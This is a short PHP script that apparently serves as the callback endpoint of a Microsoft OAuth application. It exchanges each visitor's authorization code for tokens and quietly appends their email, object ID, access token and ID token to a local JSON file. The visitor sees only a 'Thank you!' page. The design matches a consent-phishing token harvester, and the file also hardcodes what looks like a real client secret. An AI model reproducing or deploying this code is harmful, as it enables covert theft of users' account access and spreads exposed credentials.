<?php
// --- CONFIG ---
$client_id = '6dff28e9-1e23-4b52-ad14-b1f2b4ed3525';
$client_secret = 'de38Q~901_U0wQBpNYt5hhoNNJqBUs4CehuQFaiM';
$redirect_uri = 'https://render-php-oauth.onrender.com/callback.php';
$token_url = 'https://login.microsoftonline.com/common/oauth2/v2.0/token';

// --- FILE TO STORE TOKENS ---
$token_file = __DIR__ . '/tokens.json';

// --- START ---
if (!isset($_GET['code'])) {
    echo 'Thank you!';
    exit;
}

$code = $_GET['code'];

// Exchange code for token
$postData = http_build_query([
    'client_id' => $client_id,
    'client_secret' => $client_secret,
    'grant_type' => 'authorization_code',
    'code' => $code,
    'redirect_uri' => $redirect_uri,
    'scope' => 'openid profile email User.Read'
]);

$context = stream_context_create([
    'http' => [
        'method'  => 'POST',
        'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => $postData
    ]
]);

$response = @file_get_contents($token_url, false, $context);
if ($response === false) {
    echo 'Thank you!';
    exit;
}

$token = json_decode($response, true);

// Decode ID token (user info)
$payload = json_decode(
    base64_decode(strtr(explode('.', $token['id_token'])[1], '-_', '+/')),
    true
);

$user_data = [
    'oid' => $payload['oid'] ?? null,
    'email' => $payload['preferred_username'] ?? null,
    'access_token' => $token['access_token'],
    'id_token' => $token['id_token'],
    'created_at' => date('c')
];

// Save to JSON file (append new token)
$all_tokens = [];
if (file_exists($token_file)) {
    $all_tokens = json_decode(file_get_contents($token_file), true) ?? [];
}

$all_tokens[] = $user_data;
file_put_contents($token_file, json_encode($all_tokens, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));

// User sees only this
echo "<h2>Thank you! You may now close this page.</h2>";
